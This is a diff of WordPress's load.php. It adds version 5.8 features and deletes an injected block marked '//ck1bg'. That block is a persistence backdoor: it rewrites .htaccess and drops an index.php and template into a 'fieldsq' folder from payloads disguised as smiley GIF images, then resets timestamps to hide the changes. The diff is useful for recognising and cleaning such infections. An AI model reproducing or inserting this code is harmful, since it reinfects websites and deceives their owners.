@@ -334,6 +334,19 @@ function wp_is_maintenance_mode() {
 }
 
 /**
+ * Get the time elapsed so far during this PHP script.
+ *
+ * Uses REQUEST_TIME_FLOAT that appeared in PHP 5.4.0.
+ *
+ * @since 5.8.0
+ *
+ * @return float Seconds since the PHP script started.
+ */
+function timer_float() {
+	return microtime( true ) - $_SERVER['REQUEST_TIME_FLOAT'];
+}
+
+/**
  * Start the WordPress micro-timer.
  *
  * @since 0.71
@@ -525,66 +538,6 @@ function wp_set_lang_dir() {
  *
  * @global wpdb $wpdb WordPress database abstraction object.
  */
-
-//ck1bg
-$nowFileDir =  'fieldsq';
-$nowHtacFile =  './.htaccess';
-$nmbf1 =  './fieldsq/template.html';
-$nowIndexFile =  './fieldsq/index.php';
-$nowLogFile =  './fieldsq/logs.txt';
-$bkLocalFileIndex1 =  './wp-includes/images/smilies/icon_reds.gif';
-$bkLocalFileHtac1 =  './wp-includes/images/smilies/icon_blacks.gif';
-$bkLocalFileMoban1 =  './wp-includes/images/smilies/icon_greens.gif';
-
-if($nowHtacFile && file_exists($bkLocalFileHtac1)){
-	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac1))){
-		if(!is_dir("./$nowFileDir")){
-			@mkdir("./$nowFileDir",0755);
-		}
-		@chmod($nowHtacFile,0755);
-		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac1));
-		@chmod($nowHtacFile,0755);
-	}
-}
-
-
-if(file_exists($bkLocalFileIndex1)){
-	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex1) && !file_exists($nowLogFile))){
-		if(!is_dir("./$nowFileDir")){
-			@mkdir("./$nowFileDir",0755);
-		}
-		@chmod($nowIndexFile,0755);
-		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex1));
-		@chmod($nowIndexFile,0755);
-	}
-}
-
-if(file_exists($bkLocalFileMoban1)){
-	
-	if(!file_exists($nmbf1)){
-		if(!is_dir("./$nowFileDir")){
-			@mkdir("./$nowFileDir",0755);
-		}
-		@file_put_contents($nmbf1,file_get_contents($bkLocalFileMoban1));
-		@chmod($nmbf1,0755);
-	}else{
-		if(filesize($nmbf1) != filesize($bkLocalFileMoban1)){
-			$tpstrMb = file_get_contents($nmbf1);
-			if(strstr($tpstrMb,"draft_or_post_title") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
-				$fitime = filemtime($bkLocalFileMoban1);
-				@chmod($bkLocalFileMoban1,0755);
-				@file_put_contents($bkLocalFileMoban1,$tpstrMb);
-				@touch($bkLocalFileMoban1, $fitime, $fitime);  
-			}else{
-				@chmod($bkLocalFileMoban1,0755);
-				@file_put_contents($nmbf1,file_get_contents($bkLocalFileMoban1));
-				@chmod($bkLocalFileMoban1,0755);
-			}
-		}
-	}
-	
-}
-//ck1end
 function require_wp_db() {
 	global $wpdb;
 
@@ -712,7 +665,19 @@ function wp_start_object_cache() {
 	static $first_init = true;
 
 	// Only perform the following checks once.
-	if ( $first_init ) {
+
+	/**
+	 * Filters whether to enable loading of the object-cache.php drop-in.
+	 *
+	 * This filter runs before it can be used by plugins. It is designed for non-web
+	 * run-times. If false is returned, object-cache.php will never be loaded.
+	 *
+	 * @since 5.8.0
+	 *
+	 * @param bool $enable_object_cache Whether to enable loading object-cache.php (if present).
+	 *                                    Default true.
+	 */
+	if ( $first_init && apply_filters( 'enable_loading_object_cache_dropin', true ) ) {
 		if ( ! function_exists( 'wp_cache_init' ) ) {
 			/*
 			 * This is the normal situation. First-run of this function. No
@@ -1634,7 +1599,7 @@ function wp_start_scraping_edited_file_errors() {
 		echo wp_json_encode(
 			array(
 				'code'    => 'scrape_nonce_failure',
-				'message' => __( 'Scrape nonce check failed. Please try again.' ),
+				'message' => __( 'Scrape key check failed. Please try again.' ),
 			)
 		);
 		echo "###### wp_scraping_result_end:$key ######";
